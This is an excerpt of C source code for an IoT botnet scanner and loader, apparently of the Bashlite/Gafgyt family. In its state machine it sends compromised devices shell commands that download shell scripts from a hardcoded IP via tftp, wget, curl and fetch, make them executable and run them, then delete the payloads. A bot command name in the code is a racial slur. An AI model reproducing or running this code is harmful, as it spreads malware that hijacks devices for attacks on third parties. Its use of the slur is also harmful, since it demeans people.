...
void echoLoader()
{
        ...
        int fd;
        fd = socket_connect("198.23.139.215 ", 80); 
...
void StartTheLelz(int nothing)
{
        ...
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        ...
                        case 8:
                                {
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox tftp 198.23.139.215  -c get tftp.sh || tftp 198.23.139.215  -c get tftp.sh;chmod +x tftp.sh || busybox chmod +x tftp.sh;sh tftp.sh;busybox tftp -r tftp2.sh -g 198.23.139.215  || tftp -r tftp2.sh -g 198.23.139.215 ;chmod +x tftp2.sh || busybox chmod +x tftp2.sh;sh tftp2.sh;busybox wget http://198.23.139.215 /gtop.sh || wget http://198.23.139.215 /gtop.sh || curl -O http://198.23.139.215 /curl.sh || fetch http://198.23.139.215 /fetch.sh || lwp-download http://198.23.139.215 /lwdown.sh; busybox chmod +x gtop.sh || chmod +x gtop.sh;busybox chmod +x curl.sh || chmod +x curl.sh;busybox chmod +x fetch.sh || chmod +x fetch.sh;busybox chmod +x lwdown.sh || chmod +x lwdown.sh;sh gtop.sh;sh curl.sh;sh fetch.sh;sh lwdown.sh\r\n", 785, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 9;
                                }
                                break;	
						case 9:
                                {
										echoLoader();
                                        send(fds[i].fd, "sh x;chmod +x z;./z;rm -rf z;rm -f x\r\n", 38, MSG_NOSIGNAL); // sending shell command 2 times to assure execution.
                                        fds[i].state = 11;
                                }
                                break;
                        case 11:
	...
	int x;
        ...
        if(!strcmp(argv[0], "SCANNER"))
        {
                ...
                if(!strcmp(argv[1], "ON"))
                {
                        ...
                        uint32_t parent;
                        parent = fork();
						printf("Dem fucking scanner is started\n");
		...
		*/
        ...
        if(!strcmp(argv[0], "FUCKOFFNIGGER"))
        {
                exit(0);
        }
}
